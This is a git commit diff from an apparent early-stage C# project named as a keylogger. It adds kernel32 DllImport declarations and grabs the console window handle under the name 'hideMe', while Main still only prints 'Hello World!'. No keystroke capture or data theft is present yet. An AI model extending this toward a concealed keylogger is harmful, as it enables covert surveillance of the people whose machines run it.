6094e51a82e67bba747ef0cde3db48971bb377f2
[4L4M1N] <[mohammadamin601@gmail.com]>
2018-09-05 23:44:06 +0600

    dllimport

--- Program.cs
+++ Program.cs
@@ -1,12 +1,21 @@
 ﻿using System;
+using System.Runtime.InteropServices;
 
 namespace C__keylogger
 {
+    
+    
     class Program
     {
         static void Main(string[] args)
         {
+            var hideMe = GetConsoleWindow();
             Console.WriteLine("Hello World!");
         }
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr GetModuleHandle(string lpModuleName); //about Extern: The extern modifier is typically used in conjunction with a DllImport attribute, allowing external methods to be implemented by DLLs (Dynamic Link Libraries). 
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
     }
 }
